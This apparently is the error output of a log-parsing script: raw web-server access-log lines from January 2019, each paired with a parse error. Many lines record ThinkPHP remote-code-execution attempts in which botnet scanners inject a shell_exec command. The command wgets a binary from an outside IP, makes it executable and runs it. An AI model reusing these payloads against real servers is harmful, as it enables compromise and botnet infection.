('178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.74 - - [22/Jan/2019:08:27:26 +0330] "\\x13BitTorrent protocol\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x05\\x7FI\\xE3\\x1Ao\\xC6\\x13\\x9D\\xCE\\xBB2\\xBD(\\x10w\\xC8\\x99\\xC1\\xC1\\xCC-UW0I2M-QuIQ4GIjrmt2\\x0F\\x8A\\x00\\xAD\\x96\\x97\\x96\\xAB\\x00\\x22**\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('80.82.64.127 - - [22/Jan/2019:08:40:11 +0330] "\\x16\\x03\\x01\\x00\\x96\\x01\\x00\\x00\\x92\\x03\\x03\\xCB\\x077\\xE6\\x83Nq>\\xB5\\xED\\x9E\\x87\\xB7\\x08\\xD7\\xEAF" 400 166 "-" "-" "-"\n', 'list index out of range')
('178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.74 - - [22/Jan/2019:08:27:26 +0330] "\\x13BitTorrent protocol\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x05\\x7FI\\xE3\\x1Ao\\xC6\\x13\\x9D\\xCE\\xBB2\\xBD(\\x10w\\xC8\\x99\\xC1\\xC1\\xCC-UW0I2M-QuIQ4GIjrmt2\\x0F\\x8A\\x00\\xAD\\x96\\x97\\x96\\xAB\\x00\\x22**\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('80.82.64.127 - - [22/Jan/2019:08:40:11 +0330] "\\x16\\x03\\x01\\x00\\x96\\x01\\x00\\x00\\x92\\x03\\x03\\xCB\\x077\\xE6\\x83Nq>\\xB5\\xED\\x9E\\x87\\xB7\\x08\\xD7\\xEAF" 400 166 "-" "-" "-"\n', 'list index out of range')
('126.60.209.224 - - [22/Jan/2019:09:35:56 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('72.52.125.78 - - [22/Jan/2019:09:55:32 +0330] "\\x17\\x10\\x05\\x15JL\\xAD\\xDC\\xCEL\\xC1Ff>F" 400 166 "-" "-" "-"\n', 'list index out of range')
('119.93.85.191 - - [22/Jan/2019:10:55:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('146.52.111.201 - - [22/Jan/2019:11:07:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('118.68.205.57 - - [22/Jan/2019:11:41:43 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('218.228.8.49 - - [22/Jan/2019:11:49:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('104.40.2.56 - - [22/Jan/2019:12:06:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('78.187.39.146 - - [22/Jan/2019:13:24:49 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('78.187.39.146 - - [22/Jan/2019:13:24:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('78.187.39.146 - - [22/Jan/2019:13:24:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('103.215.247.149 - - [22/Jan/2019:14:17:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('108.178.16.154 - - [22/Jan/2019:14:32:00 +0330] "j\\x00\\xA7\\x00\\xF3\\x00H\\x00z\\x00\\xF3\\x00\\xFE\\x00\\xFB\\x00\\x8E\\x00\\xFE\\x00H\\x00\\x8E\\x00H\\x00\\xF3\\x00\\xA7\\x00\\xD9\\x00\\xA7\\x00\\xF3\\x00\\xB0\\x00H\\x00\\x8B\\x00\\xF3\\x00\\xC5\\x00\\xC5\\x00\\xFC\\x00\\x8E\\x00\\xFB\\x00\\xFC\\x00\\xEC\\x00\\x8B\\x00\\xF3\\x00\\xD9\\x00\\xA7\\x00\\xFB\\x00\\xFC\\x00\\xEC\\x00\\x8E\\x00\\xF3\\x00\\xFB\\x00\\xA7\\x00\\xC5\\x00\\xF3\\x00\\xEC\\x00\\x09\\x00\\x17\\x00\\xD9\\x00\\xFB\\x00z\\x00\\xD9\\x00\\xC5\\x00\\xC5\\x00z\\x00\\x17\\x00\\xA7\\x00\\x17\\x00\\x8B\\x00\\xF3\\x00\\x17\\x00\\xA7\\x00j\\x00j\\x00\\xC5\\x00\\x8E\\x00\\x09\\x00\\x09\\x00\\x09\\x00\\x17\\x00\\xFB\\x00\\x8B\\x00z\\x00H\\x00\\xFB\\x00\\x8E\\x00\\xA7\\x00\\x09\\x00\\x8B\\x00\\x8E\\x00z\\x00z\\x00\\xB0\\x00\\x17\\x00\\x8E\\x00\\xC5\\x00j\\x00\\xEC\\x00\\xFB\\x00\\xEC\\x00\\xC5\\x00\\x8E\\x00\\xB0\\x00\\xC5\\x00\\x17\\x00\\x17\\x00H\\x00\\xFB\\x00\\xB0\\x00\\xA7\\x00\\xA7\\x00\\xFB\\x00\\xB0\\x00\\x8E\\x00\\xC5\\x00\\xB0\\x00H\\x00\\x17\\x00\\xC5\\x00\\x8B\\x00j\\x00\\x8E\\x00\\xEC\\x00\\xF3\\x00\\xFE\\x00\\xD9\\x00\\xF3\\x00\\xA7\\x00j\\x00\\xEC\\x00\\xA7\\x00\\xB0\\x00\\x17\\x00\\xFC\\x00H\\x00H\\x00\\x09\\x00\\x09\\x00\\x09\\x00H\\x00\\x8E\\x00\\xCE\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('1.52.109.77 - - [22/Jan/2019:14:33:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('120.75.116.136 - - [22/Jan/2019:14:56:10 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('37.191.134.207 - - [22/Jan/2019:15:14:37 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('5.140.135.145 - - [22/Jan/2019:15:23:27 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('88.247.102.229 - - [22/Jan/2019:15:54:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('202.214.186.65 - - [22/Jan/2019:16:32:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('49.241.214.70 - - [22/Jan/2019:16:52:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('151.239.241.163 - - [22/Jan/2019:17:40:26 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28790},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60828,%2060829,%2061106]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57679,%2058602,%2062570]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[987106,%20987121,%20992487,%201034825,%201043822,%201043964,%201050125,%201058377,%201059103,%201065069,%201069943,%201071346,%201077679,%201080951,%201081548,%201081592,%201085226,%201090300,%201090638,%201090765,%201090829,%201096423,%201098133,%201098263,%201098306,%201098365,%201098677,%201098896,%201098936,%201101429,%201103340,%201103766,%201124747,%201129667,%201138598,%201139716,%201151604,%201157578,%201173836,%201177646,%201177724,%201177802,%201177880,%201177958,%201184023,%201184100,%201184177,%201184254,%201185435,%201186836,%201188122,%201188190,%201188289,%201188356,%201188580,%201188646,%201188714,%201188779,%201188846,%201188910,%201188974,%201189040,%201189103,%201189168,%201189230,%201189294,%201189355,%201189418,%201189478,%201189540,%201189599,%201189660,%201189718,%201189776,%201189836,%201189893,%201189952,%201190008,%201190066,%201190121,%201190178,%201190234,%201190287,%201190605,%201190657,%201190710,%201190761,%201193820,%201194310,%201194382,%201195748,%201195816,%201197112,%201197190,%201199572,%201199677,%201201148,%201205466,%201205607,%201209126,%201212283,%201216427,%201217612,%201220301,%201227114,%201227566,%201227647,%201230545,%201230625,%201230705,%201231883,%201232726,%201235726,%201239597,%201244186,%201250215,%201253250,%201255769,%201258720,%201261082,%201269482,%201271604,%201281340,%201281957,%201281965,%201284378,%201284386,%201285873,%201297334,%201297427,%201297489,%201297577,%201300614,%201301456,%201305437,%201314325,%201319335,%201325872,%201336661,%201336680,%201337864,%201338817,%201354442,%201366685,%201367179,%201395027,%201395660,%201421565,%201432684,%201451797,%201470884,%201471379,%201496577,%201529070,%201539470,%201548769,%201556973,%201557020,%201566841,%201579049,%201592648,%201593169,%201593325,%201595980,%201597681,%201601112,%201601149,%201602202,%201610910,%201628256,%201645571,%201652851,%201664619,%201675378,%201688189,%201696659,%201697024,%201707067,%201709359,%201713472,%201728294,%201728702,%201735762,%201736761,%201736937,%201738206,%201738393,%201738396,%201738399,%201738403,%201742639,%201744324,%201744364,%201750336,%201750790,%201755206,%201763498,%201780188,%201786013,%201795468,%201797424,%201800533,%201800910,%201802304,%201802469,%201809758,%201821471,%201824569,%201824643,%201824852,%201824934,%201825015,%201825157,%201825619,%201825706,%201826386,%201826489,%201826591,%201826819,%201826922,%201827124,%201828346,%201829560,%201829784,%201829942,%201831483,%201831589,%201831694,%201831800,%201831905,%201832010,%201832116,%201832283,%201832663,%201832664,%201833024,%201833131,%201833132,%201833240,%201835488,%201836063,%201836231,%201836341,%201836493,%201837002,%201837175,%201837286,%201837287,%201837398,%201837399,%201837725,%201838724,%201842685,%201844939,%201849743,%201853086,%201853413,%201856027,%201857897,%201865492,%201873202,%201884294,%201897795,%201897832,%201899561,%201901452,%201907619,%201908878,%201908938,%201908998,%201909060,%201911987,%201912031,%201912955,%201915059,%201919815,%201930846,%201931495,%201931563,%201933015,%201937676,%201942542,%201953747,%201960558,%201960739,%201965157,%201031381,%201034826,%201043823,%201043965,%201050126,%201058378,%201059104,%201065070,%201069944,%201070655,%201071347,%201077680,%201080952,%201081549,%201081593,%201085227,%201090301,%201092161,%201092284,%201098366,%201101430,%201124748,%201129668,%201138599,%201139717,%201151605,%201157579,%201186837,%201191838,%201195750,%201195818,%201197113,%201197191,%201199573,%201199678,%201201149,%201205467,%201205608,%201209127,%201212284,%201216428,%201217613,%201220302,%201227115,%201227567,%201227648,%201230546,%201230626,%201230706,%201231884,%201232727,%201235727,%201239598,%201244187,%201250216,%201253251,%201255770,%201258721,%201261083,%201269483,%201271605,%201281958,%201281966,%201284379,%201284387,%201285874,%201286328,%201297335,%201297428,%201297490,%201297578,%201300615,%201301457,%201305438,%201314326,%201325873,%201334356,%201334493,%201334727,%201337865,%201340881,%201354443,%201366687,%201367181,%201395029,%201395662,%201421567,%201432686,%201451799,%201470886,%201471381,%201496579,%201529072,%201539472,%201548771,%201556975,%201557022,%201566843,%201579051,%201595982,%201597683,%201601114,%201601151,%201602204,%201610912,%201628258,%201645573,%201652853,%201664621,%201675380,%201688191,%201709363,%201713474,%201763500,%201780190,%201786017,%201797426,%201802306,%201809760,%201849745,%201853088,%201857899,%201865494,%201873204,%201884296,%201901454,%201907621,%201919817,%201931657,%201932158,%201955188,%201965159,%201282274,%201285875,%201297336,%201297429,%201297492,%201297579,%201300616,%201301458,%201305439,%201314327,%201336662,%201336706,%201337866,%201338818,%201350826,%201354444,%201366689,%201367183,%201395031,%201395664,%201421569,%201432688,%201451801,%201470888,%201471383,%201496581,%201529074,%201539474,%201548773,%201556977,%201557024,%201566845,%201579053,%201592650,%201593173,%201593329,%201595984,%201597685,%201601116,%201601153,%201602206,%201610914,%201628260,%201645575,%201652855,%201664623,%201675382,%201688193,%201709365,%201713476,%201744326,%201744366,%201746850,%201746867,%201746884,%201755658,%201759624,%201763502,%201780192,%201786019,%201802308,%201809762,%201821473,%201833376,%201838726,%201842687,%201844941,%201849747,%201853090,%201857901,%201866924,%201897797,%201897834,%201901603,%201901682,%201901762,%201901" 414 186 "-" "-" "-"\n', 'list index out of range')
('91.99.30.32 - - [22/Jan/2019:17:55:40 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:9103},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[23228,%2061448,%2061449,%2061450,%2061461]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[15503,%2015504]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[88510,%2090111,%2092944,%20121366,%20121446,%20124092,%20130052,%20257155,%20319972,%20320568,%20341312,%20347500,%20387843,%20413773,%20421310,%20421462,%20425250,%20445328,%20504509,%20504510,%20509896,%20513117,%20513613,%20516806,%20518672,%20529249,%20550946,%20553838,%20564459,%20564482,%20564505,%20568654,%20568686,%20568709,%20568733,%20568757,%20568785,%20568808,%20569422,%20569445,%20576760,%20590017,%20592895,%20616123,%20645832,%20727654,%20741325,%20774325,%20774540,%20775973,%20785148,%20790007,%20790050,%20790093,%20790136,%20790179,%20790222,%20790265,%20790308,%20790351,%20790394,%20790437,%20790480,%20790523,%20790566,%20803147,%20815335,%20817410,%20824261,%20824262,%20849125,%20849413,%20849455,%20849496,%20849536,%20849575,%20849613,%20849650,%20849686,%20849721,%20849755,%20849788,%20849820,%20896020,%20924813,%20952339,%20952367,%20952395,%20952423,%20952451,%20952479,%20965167,%20980115,%20989118,%20989125,%201019363,%201021710,%201023616,%201024837,%201024917,%201028277,%201045742,%201053292,%201058499,%201058603,%201072508,%201082755,%201082843,%201089360,%201095251,%201109859,%201133106,%201159321,%201159616,%201159689,%201163551,%201163624,%201163698,%201163771,%201163843,%201163913,%201166793,%201166862,%201166931,%201167143,%201185124,%201191706,%201204943,%201220745,%201229475,%201234154,%201239180,%201254328,%201310665,%201318685,%201318866,%201318869,%201319331,%201341077,%201342259,%201349733,%201375595,%201410807,%201422061,%201430180,%201436511,%201438435,%201439336,%201439484,%201442351,%201444123,%201459962,%201460279,%201472352,%201472670,%201476319,%201476348,%201476377,%201476407,%201476835,%201476888,%201476917,%201480938,%201487157,%201489097,%201495473,%201509217,%201512877,%201512886,%201512897,%201512911,%201512926,%201512943,%201512963,%201512985,%201513008,%201513034,%201513062,%201513090,%201513120,%201513149,%201513842,%201513874,%201520644,%201523425,%201524024,%201524051,%201524052,%201530700,%201530718,%201539844,%201545908,%201564704,%201564745,%201565899,%201570357,%201570418,%201574436,%201579448,%201589699,%201594691,%201596664,%201601882,%201620684,%201656976,%201688033,%201702050,%201713360,%201732681,%201743714,%201763346,%201779832,%201785697,%201800631,%201800670,%201817045,%201818196,%201818223,%201818250,%201818284,%201818315,%201818316,%201818348,%201818379,%201818410,%201818450,%201818482,%201818522,%201818554,%201818585,%201824077,%201835567,%201836727,%201836755,%201837933,%201837983,%201838803,%201848063,%201850593,%201851102,%201853977,%201854067,%201854991,%201855053,%201855170,%201856037,%201856625,%201856880,%201856962,%201856974,%201857003,%201857191,%201859427,%201859428,%201863619,%201868735,%201871516,%201871544,%201873427,%201873544,%201873606,%201875938,%201875999,%201876060,%201876121,%201876182,%201876455,%201877519,%201877581,%201877582,%201879447,%201880307,%201882561,%201882641,%201882649,%201882651,%201883595,%201889476,%201893353,%201894172,%201902553,%201903836,%201909254,%201921090,%201921163,%201921273,%201930633,%201944604,%201954313,%201968157,%201970363,%201970676,%201973196,%2088511,%20121367,%20121445,%20124093,%20130053,%20257156,%20301334,%20305696,%20319973,%20320569,%20347501,%20387844,%20413774,%20421311,%20421463,%20425251,%20445329,%20504511,%20504512,%20509897,%20513118,%20513614,%20516807,%20518673,%20529250,%20550947,%20553839,%20564460,%20564483,%20564506,%20568655,%20568687,%20568710,%20568734,%20568758,%20568786,%20568809,%20569423,%20569446,%20576761,%20590018,%20592896,%20616124,%20645833,%20727655,%20741326,%20774326,%20774541,%20775974,%20785149,%20790008,%20790051,%20790094,%20790137,%20790180,%20790223,%20790266,%20790309,%20790352,%20790395,%20790438,%20790481,%20790524,%20790567,%20803148,%20815336,%20817411,%20824263,%20824264,%20849126,%20849414,%20849456,%20849497,%20849537,%20849576,%20849614,%20849651,%20849687,%20849722,%20849756,%20849789,%20849821,%20896021,%20924814,%20952340,%20952368,%20952396,%20952424,%20952452,%20952480,%20965168,%20980116,%20989119,%20989126,%20989828,%20994026,%201021711,%201022006,%201024838,%201024918,%201045743,%201053293,%201058500,%201058604,%201072509,%201082756,%201082844,%201089361,%201095252,%201109860,%201133107,%